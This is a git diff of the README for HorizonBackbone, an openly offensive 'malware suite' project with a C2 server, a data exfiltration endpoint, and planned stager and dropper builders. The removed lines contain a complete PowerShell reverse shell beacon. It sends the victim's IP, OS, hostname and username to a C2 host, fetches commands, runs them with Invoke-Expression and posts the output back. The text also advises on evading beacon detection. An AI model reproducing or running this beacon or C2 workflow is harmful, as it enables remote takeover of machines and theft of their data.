@@ -24,8 +24,9 @@ The heart of the Horizon Malware Suite and used for all kinds of things.
 - [X] Make a better UI for the web-interface
 - [X] C2 Server and API
 - [X] Frontend for C2 Server
-- [ ] Rewrite API and frontend as microservices
-- [ ] API & frontend authentication
+- [ ] Rewrite API and frontend as microservices (in progress)
+- [ ] API & frontend authentication (in progress)
+- [ ] Control interface for a [Traverse](https://github.com/maxbirnbacher/Traverse) redirection network
 - [ ] Dynamic creation of stagers/droppers
 - [ ] Frontend-Dialog for stager/dropper creation
 - [ ] File upload for droppers
@@ -48,13 +49,13 @@ Start the stack with `docker-compose up -d` and you are good to go.
 
 ## Usage
 
-### Dashboard
+### Dashboard (DEPRECATED)
 
 After starting the stack you can access the Webinterface by accessing `http://SERVER_IP_OR_DOMAIN:8000` in your browser.
 
 There you can (*currently*) choose between the Data Exfiltration and the C2 Server.
 
-### Data Exfiltration
+### Data Exfiltration (DEPRECATED)
 
 To exfiltrate data you can use the '/upload' endpoint.
 
@@ -66,7 +67,7 @@ If you click on the filename you can access the file and download it.
 
 ![FileView](https://github.com/maxbirnbacher/HorizonBackbone/assets/66524685/75e3ff57-d2e7-45da-8c4d-8f8beffb0653)
 
-### C2 Server
+### C2 Server (DEPRECATED)
 
 The C2 Server is intended for long-term usage. Communication should take place over a long period of time that are non-linear to avoid beacon detection.
 
@@ -81,15 +82,13 @@ The workflow is as follows:
 
 #### Reverse Shell Example
 
-Here is an example of a reverse shell using the C2 Server. Replace the IP address in the `$main_url` variable and in some other url variables with the IP address of your server.
+You can find reverse shell examples in my [Reverse Shell Repository](https://github.com/maxbirnbacher/ReverseShells).
 
-```PowerShell
-$ip_address=((ipconfig|Select-String "IPv4 Address").ToString() -split ": ")[-1];$os_type=(Get-WmiObject -Class Win32_OperatingSystem).Caption;$hostname=(Get-WmiObject -Class Win32_ComputerSystem).Name;$username=[Environment]::UserName;$main_url="http://10.0.0.9:8000";$interval=30;$intervalUnit="Seconds";$body=@{os_type=$os_type;ip_address=$ip_address;hostname=$hostname;username=$username;password="placeholder"}|ConvertTo-Json;Write-Host "IP Address: $ip_address";Write-Host "OS Type: $os_type";Write-Host "Hostname: $hostname";Write-Host "Username: $username";$url="http://10.0.0.9:8000/register?os_type=$os_type&ip_address=$ip_address&hostname=$hostname&username=$username&password=$password";$response=Invoke-RestMethod -Method Post -Uri $url;$connection_id=$response.id;Write-Host "Registered connection with ID: $connection_id";while($true){$url="$main_url/commands/$connection_id";$command=Invoke-RestMethod -Method Get -Uri $url;Write-Host "Received command: $command";if([string]::IsNullOrEmpty($command)){write-host "No command received yet...";$startSleepCmd="Start-Sleep -$intervalUnit $interval";$startSleepCmdStr=[String]$startSleepCmd;Invoke-Expression $startSleepCmdStr;continue;}if($command -eq "exit"){write-host "Exiting...";break;}write-host "Executing command: $command";if($command -ne "" -or $null -ne $command){$commandStr=[String]$command;$result=Invoke-Expression $commandStr;$output=$result|Out-String;$body=@{output=$output}|ConvertTo-Json;$url="$main_url/output/send/$connection_id";$body=@{output=$output}|ConvertTo-Json;Invoke-RestMethod -Method Post -Uri $url -Body $body;}}
-```
+At the moment I recommend using the `simpleBeacon2.ps1` script. It is a simple reverse shell that connects to the C2 server and waits for commands.
 
 ### API
 
-You can find all the API endpoints in the under `http://SERVER_IP_OR_DOMAIN:8000/docs`.
+You can find all the API endpoints at `/docs` on their respective ports.
 
 
 
